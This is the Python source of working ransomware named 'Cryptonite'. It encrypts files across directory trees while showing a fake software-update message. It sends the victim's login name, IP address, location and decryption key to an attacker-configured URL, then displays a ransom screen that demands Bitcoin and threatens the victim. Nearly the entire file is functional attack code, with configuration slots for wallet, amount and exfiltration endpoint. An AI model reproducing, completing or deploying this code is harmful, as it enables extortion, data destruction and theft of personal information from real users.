# imports

import os
from cryptography.fernet import Fernet
import random
from datetime import datetime
import time
import requests as r
import json
import tqdm
import pymsgbox as pmb

# ----------------> Cryptonite program begins here. <---------------- #

key = Fernet.generate_key()
fe = Fernet(key)
dkrpt = random.randint(100000, 999999)
uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")

# some GLOBALS
URL = ""                        # <----  REQUIRED (Use exeGen.. It is much easier)
BTC_AMOUNT = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
BTC_WALLET = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
EMAIL = ""                      # <----  REQUIRED (Use exeGen.. It is much easier)
EXT = ".cryptn8"                # <----  OPTIONAL (Use exeGen.. It is much easier)

fileLists = []                  # stores the files to be encrypted
fileList = []                   # stores the files to be decrypted


# --> Directories to be devoid of encryption <-- #
EXCLUDED_DIRS = [   "/Windows",
                    "/Program Files",
                    "/Program Files (x86)",
                    "/AppData"
                ]


# ----------------> Main Cryptonite Class <---------------- #

class Cryptonite():
    def __init__(self,key,fe,dkrpt,uniqKey):
        self.key = key
        self.fernetEncrypt = fe
        self.decryptPlease = dkrpt
        self.uniqueKey = uniqKey

    def sendKeys(self):
        id = uniqKey
        user = os.getlogin()
        key = self.decryptPlease
        try:
            info = eval(r.get("https://ipinfo.io/json").text)
            ip = info["ip"]
            lat = info["loc"].split(",")[0]
            long = info["loc"].split(",")[1]
            location = info["city"] + ", " + info["region"] + ", " +info["country"]
            jsonFormat = {
                "uniqueId": id,
                "user": user,
                "key": key,
                "ip": ip,
                "latitude": lat,
                "longitude": long,
                "location": location
            }
            r.post(URL, data=json.dumps(jsonFormat))
        except:
            pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
            exit()
            
    def findFiles(self):
        print("Please be patient, checking for new updates...\n")
        time.sleep(5)
        print("Update found! Downloading the files... \n")
        for root, dir, file in os.walk('./testfolder'):
            for i in range(len(EXCLUDED_DIRS)):
                if EXCLUDED_DIRS[i] in root:
                    break
                else:
                    if i == len(EXCLUDED_DIRS) - 1:
                        for files in file:
                            files = os.path.join(root, files)
                            fileLists.append(files)
        print("Download Completed!\n")
        time.sleep(2)
        print("Installing the Updates. This might take some time. Please be patient... \n")
        self.encrypt()
        os.system("cls" if os.name == 'nt' else "clear") 

    def encrypt(self):        
        for file in tqdm.tqdm(fileLists):
            flag = 0
            newfile = str(file)+EXT
            try:
                with open(file, "rb") as f:
                    data = f.read()
                    encryptedData = self.fernetEncrypt.encrypt(data)
            except:
                flag = 1
            if flag == 0:
                try:
                    with open (file, "wb") as f:
                        fileList.append(file)
                        f.write(encryptedData)
                    os.rename(file, newfile)
                except:
                    pass     
  
    def decrypt(self):
        for files in fileList:
            flag = 0
            try:
                with open(str(files)+EXT, "rb") as f:
                    data = f.read()
            except:
                flag = 1
            if flag == 0:
                try:
                    with open(str(files)+EXT, "wb") as f:
                        decryptedData = self.fernetEncrypt.decrypt(data)
                        f.write(decryptedData)
                    os.rename(str(files)+EXT, files)
                except:
                    pass
                  
                  
# ----------------> Graphical User Interface <---------------- #
class System(Cryptonite):
    def __init__(self):
        super().__init__(key,fe,dkrpt,uniqKey)

    def warningScreen(self):
        import tkinter as tk
        import tkinter.ttk as ttk
        window = tk.Tk()
        
        def clear1(*args):
            decryption_key.delete("0", tk.END)

        def key_collect():
            try:
                key = int(decryption_key.get())
                if int(key) == self.decryptPlease:
                    self.decrypt()
                    window.destroy()
                else:
                    pmb.confirm("Wrong KEY!", buttons=['OK'])
                    window.destroy()
                    exit()
            except:
                pmb.confirm("Wrong KEY!", buttons=['OK'])
                window.destroy()
                exit()
        
        window.title("Cryptonite")
        window.resizable(0,0)
        window.rowconfigure(0, minsize = 300)
        window.columnconfigure(0, minsize = 300)

        style = ttk.Style()
        style.configure('TButton', font=("Apple Chancery", 18))
        style.configure('small.TButton', font=("Apple Chancery", 8))

        frm_main = tk.Frame(master = window, bg = "black")
        frm_main.grid(row = 0, column = 0, sticky = "nsew", padx = 2, pady = 2)

        frm_main.rowconfigure([0,1,2,3,4,5,6,7], weight = 1)
        frm_main.columnconfigure(0, weight = 1)
        frm_main.columnconfigure(1, weight = 1)

        lbl_main = tk.Label(master = frm_main, text = "WARNING!", font=("Apple Chancery", 50), fg = "red", bg = "black")
        lbl_main.grid(row = 0, column = 0, pady = 5, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = "Some / All of Your Files Have Been Encrypted!", font=("Apple Chancery", 40), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 1, column = 0, columnspan = 2, padx = 10, pady = 5)
        decryption_key = tk.Entry(master = frm_main, font=("Apple Chancery", 25), fg = "grey")
        decryption_key.grid(row = 2, column = 0, columnspan = 1, sticky = "e", pady = 3)
        decryption_key.insert("0", "DECRYPTION_KEY")
        decryption_key.bind("<Button-1>", clear1)
        decryption_key_button = ttk.Button(style = 'TButton', master = frm_main, text = "Submit", command = key_collect)
        decryption_key_button.grid(row = 2, column = 1, sticky = "w", padx = 5)
        lbl_main1 = tk.Label(master = frm_main, text = "It uses military grade encryption to encrypt your files. It requires a DECRYPTION_KEY for decryption process", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 3, column = 0, columnspan = 2, pady = 5)
        lbl_main1 = tk.Label(master = frm_main, text = "Do not Close this Window! Else face the consequences!", font=("Apple Chancery", 25), bg = "black", fg = "red")
        lbl_main1.grid(row = 4, column = 0, columnspan = 2, padx = 10, pady = 3)
        lbl_main1 = tk.Label(master = frm_main, text = "What you can do?", font=("Apple Chancery", 20), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 5, column = 0, columnspan = 2)
        lbl_main1 = tk.Label(master = frm_main, text = "Don't worry! Your files can still be decrypted.\nYou just need to put in the correct DECRYPTION_KEY in the text box provided.\n\nIn order to get the DECRYPTION_KEY:\n\n1. Send us the specified amount of BTC to the address mentioned below. \n2. Send us the valid screenshots via email along with your UNIQUE_ID.    \n\nDo these and we will provide the correct DECRYPTION_KEY via mail.\n\nRemember! You will have only ONE CHANCE to enter the DECRYPTION_KEY.\n\nSo, do not try to be a Smart Alec.", font=("Apple Chancery", 15), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 6, column = 0, columnspan = 2, padx = 5, pady = 3)
        lbl_main1 = tk.Label(master = frm_main, text = f"BTC AMOUNT: {BTC_AMOUNT}\tBTC WALLET: {BTC_WALLET}\tEMAIL: {EMAIL}\t", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 7, column = 0, sticky = "w", columnspan = 2, pady = (10,3), padx = 3)
        lbl_main1 = tk.Label(master = frm_main, text = f"UNIQUE_ID: {uniqKey}", font=("Apple Chancery", 10), bg = "black", fg = "#39ff14")
        lbl_main1.grid(row = 7, column = 0, sticky = "e", columnspan = 2,pady = (10,3), padx = 3)

        window.mainloop()
        
        
# ----------------> MAIN EXECUTION STARTS HERE <---------------- #

if __name__ == "__main__":
  
    # --> object creation <-- #
    cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
    window = System()

    # --> sending info to database <-- #
    cryptn8.sendKeys()
    
    # --> encrypting / decrypting <-- #
    cryptn8.findFiles()
    
    # --> GUI <-- #
    window.warningScreen()
